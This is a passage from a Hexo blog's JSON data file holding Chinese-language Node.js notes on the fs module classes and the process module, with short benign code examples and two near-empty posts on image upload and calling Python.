方法会返回一个新的 <code>fs.FSWatcher</code> 对象。</p>\n<p>所有 <code>fs.FSWatcher</code> 对象都是 <a href=\"http://nodejs.cn/api/events.html\" target=\"_blank\" rel=\"noopener\"><code>EventEmitter</code></a> 的，每当监视的文件被修改时会触发 <code>&#39;change&#39;</code> 事件。</p>\n<h2 id=\"‘change’-事件\"><a href=\"#‘change’-事件\" class=\"headerlink\" title=\"‘change’ 事件\"></a>‘change’ 事件</h2><ul>\n<li><code>eventType</code> \\<string> 发生的变化事件的类型。</string></li>\n<li><code>filename</code> \\<string> | \\<buffer> 变化的文件名（如果是相关的或有效的）。</buffer></string></li>\n</ul>\n<p>当被监视的目录或文件有变化时触发。 详见 <code>fs.watch()</code></p>\n<h2 id=\"‘close’-事件\"><a href=\"#‘close’-事件\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>watcher</code> 停止监视文件变化时触发。 关闭的 <code>fs.FSWatcher</code> 对象在事件处理函数中不再可用。</p>\n<h2 id=\"‘error’-事件\"><a href=\"#‘error’-事件\" class=\"headerlink\" title=\"‘error’ 事件\"></a>‘error’ 事件</h2><p>当监视文件发生错误时触发。 </p>\n<p>发生错误的 <code>fs.FSWatcher</code> 对象在事件处理函数中<code>不再可用</code>。</p>\n<h2 id=\"watcher-close\"><a href=\"#watcher-close\" class=\"headerlink\" title=\"watcher.close()\"></a>watcher.close()</h2><p><code>fs.FSWatcher</code> <code>停止监视</code>文件的变化。 </p>\n<p>一旦停止，<code>fs.FSWatcher</code> 对象将<code>不再可用</code>。</p>\n<h1 id=\"fs-ReadStream-类\"><a href=\"#fs-ReadStream-类\" class=\"headerlink\" title=\"fs.ReadStream 类\"></a>fs.ReadStream 类</h1><p>成功调用 <code>fs.createReadStream()</code> 会返回一个新的 <code>fs.ReadStream</code> 对象。</p>\n<p><code>fs.ReadStream</code> 对象都是可读流。</p>\n<h2 id=\"‘close’-事件-1\"><a href=\"#‘close’-事件-1\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>fs.ReadStream</code> 底层的文件描述符被关闭时触发。</p>\n<h2 id=\"‘open’-事件\"><a href=\"#‘open’-事件\" class=\"headerlink\" title=\"‘open’ 事件\"></a>‘open’ 事件</h2><h2 id=\"‘ready’-事件\"><a href=\"#‘ready’-事件\" class=\"headerlink\" title=\"‘ready’ 事件\"></a>‘ready’ 事件</h2><h2 id=\"readStream-bytesRead\"><a href=\"#readStream-bytesRead\" class=\"headerlink\" title=\"readStream.bytesRead\"></a>readStream.bytesRead</h2><p>已读取的字节数。</p>\n<h2 id=\"readStream-path\"><a href=\"#readStream-path\" class=\"headerlink\" title=\"readStream.path\"></a>readStream.path</h2><h1 id=\"fs-Stats-类\"><a href=\"#fs-Stats-类\" class=\"headerlink\" title=\"fs.Stats 类\"></a>fs.Stats 类</h1><p><code>fs.Stats</code> 对象提供了一个文件的信息。</p>\n<h2 id=\"stats-isBlockDevice\"><a href=\"#stats-isBlockDevice\" class=\"headerlink\" title=\"stats.isBlockDevice()\"></a>stats.isBlockDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个块设备，则返回 true 。</p>\n<h2 id=\"stats-isCharacterDevice\"><a href=\"#stats-isCharacterDevice\" class=\"headerlink\" title=\"stats.isCharacterDevice()\"></a>stats.isCharacterDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个字符设备，则返回 true 。</p>\n<h2 id=\"stats-isDirectory\"><a href=\"#stats-isDirectory\" class=\"headerlink\" title=\"stats.isDirectory()\"></a>stats.isDirectory()</h2><p>如果 <code>fs.Stats</code> 对象表示一个文件系统目录，则返回 true 。</p>\n<h2 id=\"stats-isFIFO\"><a href=\"#stats-isFIFO\" class=\"headerlink\" title=\"stats.isFIFO()\"></a>stats.isFIFO()</h2><p>如果 <code>fs.Stats</code> 对象表示一个<code>先进先出 (FIFO) 管道</code>，则返回 true 。</p>\n<p>FIFO( First Input First Output)简单说就是指先进先出。<a href=\"https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin\" target=\"_blank\" rel=\"noopener\">百度百科: FIFO存储器</a></p>\n<h2 id=\"stats-isFile\"><a href=\"#stats-isFile\" class=\"headerlink\" title=\"stats.isFile()\"></a>stats.isFile()</h2><p>如果 <code>fs.Stats</code> 对象表示一个普通文件，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSocket\"><a href=\"#stats-isSocket\" class=\"headerlink\" title=\"stats.isSocket()\"></a>stats.isSocket()</h2><p>如果 <code>fs.Stats</code> 对象表示一个 <code>socket</code>，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSymbolicLink\"><a href=\"#stats-isSymbolicLink\" class=\"headerlink\" title=\"stats.isSymbolicLink()\"></a>stats.isSymbolicLink()</h2><p>如果 <code>fs.Stats</code> 对象表示一个符号链接，则返回 <code>true</code> 。</p>\n<p>该方法只在使用 <code>fs.lstat()</code> 时有效。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">type</th>\n<th style=\"text-align:left\">description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">stats.dev</td>\n<td style=\"text-align:left\">包含文件的设备的数值型标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ino</td>\n<td style=\"text-align:left\">文件系统特定的文件索引节点数值。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mode</td>\n<td style=\"text-align:left\">表示文件类型与模式的位域。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.nlink</td>\n<td style=\"text-align:left\">文件的硬链接数量。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.uid</td>\n<td style=\"text-align:left\">文件拥有者的数值型用户标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.gid</td>\n<td style=\"text-align:left\">拥有文件的群组的数值型群组标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.rdev</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n<p>## </p>\n<p>## </p>\n"},{"title":"Node.js--process模块","date":"2018-05-10T01:37:05.000Z","_content":"## [转][Node.js的process模块](http://www.css88.com/archives/4548)\n\n`process`模块用来与`当前进程互动`，可以 `通过全局变量process` 访问，不必使用require命令加载。它是一个`EventEmitter`对象的实例。\n\n### 一、属性\nprocess对象提供一系列属性，用于返回系统信息。\n\n+ process.pid：当前进程的进程号。\n\n+ process.version：Node的版本，比如v0.10.18。\n\n+ process.platform：当前系统平台，比如Linux。\n\n+ process.title：默认值为“node”，可以自定义该值。\n\n+ process.argv：当前进程的命令行参数数组。\n\n+ process.env：指向当前`shell`的环境变量，比如`process.env.HOME`。\n\n+ process.execPath：运行当前进程的可执行文件的绝对路径。\n\n+ process.stdout：指向标准输出。\n\n+ process.stdin：指向标准输入。\n\n+ process.stderr：指向标准错误。\n\n#### 主要属性介绍\n**1. stdout**\\\n`process.stdout`用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。\n````\nexports.log = function() {\n    process.stdout.write(format.apply(this, arguments) + '\\n');\n};\n````\n\n**2. argv**\n\n`process.argv` 返回`命令行脚本`的 各个参数 组成的数组。\n\n先新建一个脚本文件 argv.js。\n````\n// argv.js\n \nconsole.log(\"argv: \",process.argv);\nconsole.log(\"argc: \",process.argc);\n````\n\n在命令行下调用这个脚本，会得到以下结果。\n````\n> node argv.js a b c\n\n# [ 'node', '/path/to/argv.js', 'a', 'b', 'c' ]\n````\n\n上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。\n````\n// argv.js\n \nvar myArgs = process.argv.slice(2);\nconsole.log(myArgs);\n````\n\n### 二、方法\n\n`process`对象提供以下方法：\n\n+ `process.exit()`：退出当前进程。\n+ `process.cwd()`：返回运行当前脚本的工作目录的路径。_\n+ `process.chdir()`：改变工作目录。\n+ `process.nextTick()`：将一个回调函数放在下次事件循环的顶部。\n\n**1. `process.chdir()` 改变工作目录的例子:**\n````\nprocess.cwd()\n# '/home/aaa'\n \nprocess.chdir('/home/bbb')\n \nprocess.cwd()\n# '/home/bbb'\n````\n\n**2. `process.nextTick()` 指定下次事件循环首先运行的任务:**\n````\nprocess.nextTick(function () {\n    console.log('Next event loop!');\n});\n````\n\n上面代码可以用`setTimeout`改写，但是`nextTick`的`效率`更高、`描述`更准确。\n````\nsetTimeout(function () {\n    console.log('Next event loop!');\n}, 0)\n````\n\n### 三、事件\n**1. exit事件**\n\n`当前进程退出`时，会触发`exit事件`，可以对该事件指定`回调函数`。\n\n这是一个用来 `定时检查模块状态` 的好`钩子(hook)`(例如单元测试), 当主事件循环在执行完`'exit'`的回调函数后将不再执行,所以在`exit事件`中定义的定时器可能不会被加入事件列表.\n````\nprocess.on('exit', function () {\n    fs.writeFileSync('/tmp/myfile', 'This MUST be saved on exit.');\n});\n````\n\n**2. uncaughtException事件**\n\n当前`进程抛出`一个没有被捕捉的意外时，会触发uncaughtException事件。\n\n````\nprocess.on('uncaughtException', function (err) {\n    console.error('An uncaught error occurred!');\n    console.error(err.stack);\n});\n````\n\n-----------------\n[阅读原文](http://www.css88.com/archives/4548)","source":"_posts/NodeJS/Node-js-process模块.md","raw":"---\ntitle: Node.js--process模块\ndate: 2018-05-10 09:37:05\ntags: process\ncategories: Node\n---\n## [转][Node.js的process模块](http://www.css88.com/archives/4548)\n\n`process`模块用来与`当前进程互动`，可以 `通过全局变量process` 访问，不必使用require命令加载。它是一个`EventEmitter`对象的实例。\n\n### 一、属性\nprocess对象提供一系列属性，用于返回系统信息。\n\n+ process.pid：当前进程的进程号。\n\n+ process.version：Node的版本，比如v0.10.18。\n\n+ process.platform：当前系统平台，比如Linux。\n\n+ process.title：默认值为“node”，可以自定义该值。\n\n+ process.argv：当前进程的命令行参数数组。\n\n+ process.env：指向当前`shell`的环境变量，比如`process.env.HOME`。\n\n+ process.execPath：运行当前进程的可执行文件的绝对路径。\n\n+ process.stdout：指向标准输出。\n\n+ process.stdin：指向标准输入。\n\n+ process.stderr：指向标准错误。\n\n#### 主要属性介绍\n**1. stdout**\\\n`process.stdout`用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。\n````\nexports.log = function() {\n    process.stdout.write(format.apply(this, arguments) + '\\n');\n};\n````\n\n**2. argv**\n\n`process.argv` 返回`命令行脚本`的 各个参数 组成的数组。\n\n先新建一个脚本文件 argv.js。\n````\n// argv.js\n \nconsole.log(\"argv: \",process.argv);\nconsole.log(\"argc: \",process.argc);\n````\n\n在命令行下调用这个脚本，会得到以下结果。\n````\n> node argv.js a b c\n\n# [ 'node', '/path/to/argv.js', 'a', 'b', 'c' ]\n````\n\n上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。\n````\n// argv.js\n \nvar myArgs = process.argv.slice(2);\nconsole.log(myArgs);\n````\n\n### 二、方法\n\n`process`对象提供以下方法：\n\n+ `process.exit()`：退出当前进程。\n+ `process.cwd()`：返回运行当前脚本的工作目录的路径。_\n+ `process.chdir()`：改变工作目录。\n+ `process.nextTick()`：将一个回调函数放在下次事件循环的顶部。\n\n**1. `process.chdir()` 改变工作目录的例子:**\n````\nprocess.cwd()\n# '/home/aaa'\n \nprocess.chdir('/home/bbb')\n \nprocess.cwd()\n# '/home/bbb'\n````\n\n**2. `process.nextTick()` 指定下次事件循环首先运行的任务:**\n````\nprocess.nextTick(function () {\n    console.log('Next event loop!');\n});\n````\n\n上面代码可以用`setTimeout`改写，但是`nextTick`的`效率`更高、`描述`更准确。\n````\nsetTimeout(function () {\n    console.log('Next event loop!');\n}, 0)\n````\n\n### 三、事件\n**1. exit事件**\n\n`当前进程退出`时，会触发`exit事件`，可以对该事件指定`回调函数`。\n\n这是一个用来 `定时检查模块状态` 的好`钩子(hook)`(例如单元测试), 当主事件循环在执行完`'exit'`的回调函数后将不再执行,所以在`exit事件`中定义的定时器可能不会被加入事件列表.\n````\nprocess.on('exit', function () {\n    fs.writeFileSync('/tmp/myfile', 'This MUST be saved on exit.');\n});\n````\n\n**2. uncaughtException事件**\n\n当前`进程抛出`一个没有被捕捉的意外时，会触发uncaughtException事件。\n\n````\nprocess.on('uncaughtException', function (err) {\n    console.error('An uncaught error occurred!');\n    console.error(err.stack);\n});\n````\n\n-----------------\n[阅读原文](http://www.css88.com/archives/4548)","slug":"NodeJS/Node-js-process模块","published":1,"updated":"2018-05-11T01:20:43.404Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2a7003cb8xjm034mrvw","content":"<h2 id=\"转-Node-js的process模块\"><a href=\"#转-Node-js的process模块\" class=\"headerlink\" title=\"[转]Node.js的process模块\"></a>[转]<a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">Node.js的process模块</a></h2><p><code>process</code>模块用来与<code>当前进程互动</code>，可以 <code>通过全局变量process</code> 访问，不必使用require命令加载。它是一个<code>EventEmitter</code>对象的实例。</p>\n<h3 id=\"一、属性\"><a href=\"#一、属性\" class=\"headerlink\" title=\"一、属性\"></a>一、属性</h3><p>process对象提供一系列属性，用于返回系统信息。</p>\n<ul>\n<li><p>process.pid：当前进程的进程号。</p>\n</li>\n<li><p>process.version：Node的版本，比如v0.10.18。</p>\n</li>\n<li><p>process.platform：当前系统平台，比如Linux。</p>\n</li>\n<li><p>process.title：默认值为“node”，可以自定义该值。</p>\n</li>\n<li><p>process.argv：当前进程的命令行参数数组。</p>\n</li>\n<li><p>process.env：指向当前<code>shell</code>的环境变量，比如<code>process.env.HOME</code>。</p>\n</li>\n<li><p>process.execPath：运行当前进程的可执行文件的绝对路径。</p>\n</li>\n<li><p>process.stdout：指向标准输出。</p>\n</li>\n<li><p>process.stdin：指向标准输入。</p>\n</li>\n<li><p>process.stderr：指向标准错误。</p>\n</li>\n</ul>\n<h4 id=\"主要属性介绍\"><a href=\"#主要属性介绍\" class=\"headerlink\" title=\"主要属性介绍\"></a>主要属性介绍</h4><p><strong>1. stdout</strong>\\<br><code>process.stdout</code>用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.log = function() &#123;</span><br><span class=\"line\">    process.stdout.write(format.apply(this, arguments) + &apos;\\n&apos;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. argv</strong></p>\n<p><code>process.argv</code> 返回<code>命令行脚本</code>的 各个参数 组成的数组。</p>\n<p>先新建一个脚本文件 argv.js。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">console.log(&quot;argv: &quot;,process.argv);</span><br><span class=\"line\">console.log(&quot;argc: &quot;,process.argc);</span><br></pre></td></tr></table></figure></p>\n<p>在命令行下调用这个脚本，会得到以下结果。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; node argv.js a b c</span><br><span class=\"line\"></span><br><span class=\"line\"># [ &apos;node&apos;, &apos;/path/to/argv.js&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]</span><br></pre></td></tr></table></figure></p>\n<p>上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">var myArgs = process.argv.slice(2);</span><br><span class=\"line\">console.log(myArgs);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"二、方法\"><a href=\"#二、方法\" class=\"headerlink\" title=\"二、方法\"></a>二、方法</h3><p><code>process</code>对象提供以下方法：</p>\n<ul>\n<li><code>process.exit()</code>：退出当前进程。</li>\n<li><code>process.cwd()</code>：返回运行当前脚本的工作目录的路径。_</li>\n<li><code>process.chdir()</code>：改变工作目录。</li>\n<li><code>process.nextTick()</code>：将一个回调函数放在下次事件循环的顶部。</li>\n</ul>\n<p><strong>1. <code>process.chdir()</code> 改变工作目录的例子:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/aaa&apos;</span><br><span class=\"line\"> </span><br><span class=\"line\">process.chdir(&apos;/home/bbb&apos;)</span><br><span class=\"line\"> </span><br><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/bbb&apos;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. <code>process.nextTick()</code> 指定下次事件循环首先运行的任务:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.nextTick(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>上面代码可以用<code>setTimeout</code>改写，但是<code>nextTick</code>的<code>效率</code>更高、<code>描述</code>更准确。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;, 0)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"三、事件\"><a href=\"#三、事件\" class=\"headerlink\" title=\"三、事件\"></a>三、事件</h3><p><strong>1. exit事件</strong></p>\n<p><code>当前进程退出</code>时，会触发<code>exit事件</code>，可以对该事件指定<code>回调函数</code>。</p>\n<p>这是一个用来 <code>定时检查模块状态</code> 的好<code>钩子(hook)</code>(例如单元测试), 当主事件循环在执行完<code>&#39;exit&#39;</code>的回调函数后将不再执行,所以在<code>exit事件</code>中定义的定时器可能不会被加入事件列表.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;exit&apos;, function () &#123;</span><br><span class=\"line\">    fs.writeFileSync(&apos;/tmp/myfile&apos;, &apos;This MUST be saved on exit.&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. uncaughtException事件</strong></p>\n<p>当前<code>进程抛出</code>一个没有被捕捉的意外时，会触发uncaughtException事件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;uncaughtException&apos;, function (err) &#123;</span><br><span class=\"line\">    console.error(&apos;An uncaught error occurred!&apos;);</span><br><span class=\"line\">    console.error(err.stack);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-Node-js的process模块\"><a href=\"#转-Node-js的process模块\" class=\"headerlink\" title=\"[转]Node.js的process模块\"></a>[转]<a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">Node.js的process模块</a></h2><p><code>process</code>模块用来与<code>当前进程互动</code>，可以 <code>通过全局变量process</code> 访问，不必使用require命令加载。它是一个<code>EventEmitter</code>对象的实例。</p>\n<h3 id=\"一、属性\"><a href=\"#一、属性\" class=\"headerlink\" title=\"一、属性\"></a>一、属性</h3><p>process对象提供一系列属性，用于返回系统信息。</p>\n<ul>\n<li><p>process.pid：当前进程的进程号。</p>\n</li>\n<li><p>process.version：Node的版本，比如v0.10.18。</p>\n</li>\n<li><p>process.platform：当前系统平台，比如Linux。</p>\n</li>\n<li><p>process.title：默认值为“node”，可以自定义该值。</p>\n</li>\n<li><p>process.argv：当前进程的命令行参数数组。</p>\n</li>\n<li><p>process.env：指向当前<code>shell</code>的环境变量，比如<code>process.env.HOME</code>。</p>\n</li>\n<li><p>process.execPath：运行当前进程的可执行文件的绝对路径。</p>\n</li>\n<li><p>process.stdout：指向标准输出。</p>\n</li>\n<li><p>process.stdin：指向标准输入。</p>\n</li>\n<li><p>process.stderr：指向标准错误。</p>\n</li>\n</ul>\n<h4 id=\"主要属性介绍\"><a href=\"#主要属性介绍\" class=\"headerlink\" title=\"主要属性介绍\"></a>主要属性介绍</h4><p><strong>1. stdout</strong>\\<br><code>process.stdout</code>用来控制标准输出，也就是在命令行窗口向用户显示内容。它的write方法等同于console.log。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.log = function() &#123;</span><br><span class=\"line\">    process.stdout.write(format.apply(this, arguments) + &apos;\\n&apos;);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. argv</strong></p>\n<p><code>process.argv</code> 返回<code>命令行脚本</code>的 各个参数 组成的数组。</p>\n<p>先新建一个脚本文件 argv.js。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">console.log(&quot;argv: &quot;,process.argv);</span><br><span class=\"line\">console.log(&quot;argc: &quot;,process.argc);</span><br></pre></td></tr></table></figure></p>\n<p>在命令行下调用这个脚本，会得到以下结果。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; node argv.js a b c</span><br><span class=\"line\"></span><br><span class=\"line\"># [ &apos;node&apos;, &apos;/path/to/argv.js&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos; ]</span><br></pre></td></tr></table></figure></p>\n<p>上面代码表示，argv返回数组的成员依次是命令行的各个部分。要得到真正的参数部分，可以把argv.js改写成下面这样。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// argv.js</span><br><span class=\"line\"> </span><br><span class=\"line\">var myArgs = process.argv.slice(2);</span><br><span class=\"line\">console.log(myArgs);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"二、方法\"><a href=\"#二、方法\" class=\"headerlink\" title=\"二、方法\"></a>二、方法</h3><p><code>process</code>对象提供以下方法：</p>\n<ul>\n<li><code>process.exit()</code>：退出当前进程。</li>\n<li><code>process.cwd()</code>：返回运行当前脚本的工作目录的路径。_</li>\n<li><code>process.chdir()</code>：改变工作目录。</li>\n<li><code>process.nextTick()</code>：将一个回调函数放在下次事件循环的顶部。</li>\n</ul>\n<p><strong>1. <code>process.chdir()</code> 改变工作目录的例子:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/aaa&apos;</span><br><span class=\"line\"> </span><br><span class=\"line\">process.chdir(&apos;/home/bbb&apos;)</span><br><span class=\"line\"> </span><br><span class=\"line\">process.cwd()</span><br><span class=\"line\"># &apos;/home/bbb&apos;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. <code>process.nextTick()</code> 指定下次事件循环首先运行的任务:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.nextTick(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>上面代码可以用<code>setTimeout</code>改写，但是<code>nextTick</code>的<code>效率</code>更高、<code>描述</code>更准确。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function () &#123;</span><br><span class=\"line\">    console.log(&apos;Next event loop!&apos;);</span><br><span class=\"line\">&#125;, 0)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"三、事件\"><a href=\"#三、事件\" class=\"headerlink\" title=\"三、事件\"></a>三、事件</h3><p><strong>1. exit事件</strong></p>\n<p><code>当前进程退出</code>时，会触发<code>exit事件</code>，可以对该事件指定<code>回调函数</code>。</p>\n<p>这是一个用来 <code>定时检查模块状态</code> 的好<code>钩子(hook)</code>(例如单元测试), 当主事件循环在执行完<code>&#39;exit&#39;</code>的回调函数后将不再执行,所以在<code>exit事件</code>中定义的定时器可能不会被加入事件列表.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;exit&apos;, function () &#123;</span><br><span class=\"line\">    fs.writeFileSync(&apos;/tmp/myfile&apos;, &apos;This MUST be saved on exit.&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. uncaughtException事件</strong></p>\n<p>当前<code>进程抛出</code>一个没有被捕捉的意外时，会触发uncaughtException事件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process.on(&apos;uncaughtException&apos;, function (err) &#123;</span><br><span class=\"line\">    console.error(&apos;An uncaught error occurred!&apos;);</span><br><span class=\"line\">    console.error(err.stack);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"http://www.css88.com/archives/4548\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"Node.js图片上传","date":"2018-07-04T10:24:59.000Z","_content":"","source":"_posts/NodeJS/Node-js图片上传.md","raw":"---\ntitle: Node.js图片上传\ndate: 2018-07-04 18:24:59\ntags:\ncategories:\n---\n","slug":"NodeJS/Node-js图片上传","published":1,"updated":"2018-07-04T10:25:19.059Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2a8003fb8xjznq9yp6w","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Node.js调用Python","date":"2018-07-04T09:37:39.000Z","_content":"## [python-bridge](https://blog.csdn.net/ziyetian666/article/details/80493183)\n\n### npm: [Python-bridge](https://www.npmjs.com/package/python-bridge)\n\n### [API for TypeScript](https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md)","source":"_posts/NodeJS/Node-js调用Python.md","raw":"---\ntitle: Node.js调用Python\ndate: 2018-07-04 17:37:39\ntags: Node-Python-bridge\ncategories: Node\n---\n## [python-bridge](https://blog.csdn.net/ziyetian666/article/details/80493183)\n\n### npm: [Python-bridge](https://www.npmjs.com/package/python-bridge)\n\n### [API for TypeScript](https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md)","slug":"NodeJS/Node-js调用Python","published":1,"updated":"2018-07-04T09:59:30.667Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2aa003ib8xjovyw628b","content":"<h2 id=\"python-bridge\"><a href=\"#python-bridge\" class=\"headerlink\" title=\"python-bridge\"></a><a href=\"https://blog.csdn.net/ziyetian666/article/details/80493183\" target=\"_blank\" rel=\"noopener\">python-bridge</a></h2><h3 id=\"npm-Python-bridge\"><a href=\"#npm-Python-bridge\" class=\"headerlink\" title=\"npm: Python-bridge\"></a>npm: <a href=\"https://www.npmjs.com/package/python-bridge\" target=\"_blank\" rel=\"noopener\">Python-bridge</a></h3><h3 id=\"API-for-TypeScript\"><a href=\"#API-for-TypeScript\" class=\"headerlink\" title=\"API for TypeScript\"></a><a href=\"https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md\" target=\"_blank\" rel=\"noopener\">API for TypeScript</a></h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"python-bridge\"><a href=\"#python-bridge\" class=\"headerlink\" title=\"python-bridge\"></a><a 